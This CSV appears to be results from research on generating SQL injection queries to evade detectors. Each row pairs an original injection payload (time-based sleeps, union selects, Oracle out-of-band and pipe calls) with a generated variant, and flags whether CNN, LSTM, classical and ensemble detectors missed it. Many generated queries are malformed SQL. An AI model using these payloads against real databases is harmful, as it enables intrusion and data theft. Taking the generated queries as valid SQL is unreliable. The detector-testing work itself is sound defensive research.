,original_query,generated_query,validity,is_sql_injection,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
0,"1' where 6406=6406;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--","SELECT * FROM SQL SELECT MIN(*) FROM SQL SELECT MIN(*) FROM rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",1,1,0,0,0,0,0
1,"1) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (4666=4666",SELECT MIN(*) FROM SQL injection detection,1,0,1,1,1,1,1
2,-3136%') or 3400=6002,SELECT MIN(sql injection) FROM SQL_injection WHERE NOT -3016%' IS NULL,1,1,0,1,1,1,0
3,1) where 7956=7956 or sleep(5)#,SELECT * FROM query: 1) WHERE NOT SQL_inject = 7956 = 7956 OR sleep(5)# ='swift(5)',1,1,0,0,0,0,0
4,-7387'))) order by 1--,SELECT MIN(1 AS __executive_requirement) FROM SQL injection_requirement,1,0,1,1,1,1,1
5,1')) as gfzb where 7904=7904;begin dbms_lock.sleep(5); end--,SELECT MIN(end--) FROM SQL injection_detective FROM SQL_injector WHERE NOT 7904 = 7904 = 7904;begin dbms_lock.sleep(5); end--,1,1,0,0,1,0,0
6,"1))) union all select null,null,null#","SELECT null,null,null# FROM SQL SELECT MIN(sql injection detection) FROM SQL SELECT MIN(sql) FROM query: 1) 1)",1,1,0,0,1,0,0
7,"-5622"" where 7970=7970 union all select 7970,7970,7970,7970,7970--",SELECT MIN(sql injection) FROM SQL_injection WHERE NOT 7970 = 7970,1,1,1,1,1,1,1
8,"1"")) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((""smnw"" like ""smnw","SELECT DISTINCT case FROM SQL injection_deficite', COUNT(*) FROM SQL_inaddr.smnw WHERE NOT smnw IN (SELECT smnw FROM SELECT smnw)",0,0,1,1,1,1,1
9,"1));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ((7240=7240",SELECT dbms_pipe.receive_message(chr(67)||chr(67) FROM SQL_injection) FROM SQL_injection,1,1,0,0,1,0,0
10,-2604)) as sekb where 6897=6897 or 1000=7683,SELECT COUNT(*) FROM query: -2604) AS _sekb FROM query: -2603) AS :sqb WHERE NOT 6897 = 6897 = 6897 OR 1000 = 7683,1,1,0,0,0,0,0
11,"1%""))) waitfor delay '0:0:5'--",SELECT MIN(sql injection) FROM SQL_injection,1,1,1,1,1,1,1
12,"1"") as nraw where 7984=7984 and elt(3114=3114,sleep(5))#","SELECT MIN(sleep(5))# FROM SQL injection_diagnosis WHERE 7984 = 7984 = 7984 AND elt(3114 = 3114,sleep(5))# = ""sql injection detection""",0,1,0,0,0,0,0
13,1');begin dbms_lock.sleep(5); end and ('jzlr'='jzlr,"SELECT DISTINCT end, ('jzlr' = 'jzlr') FROM SQL injection detection",1,1,1,0,1,1,0
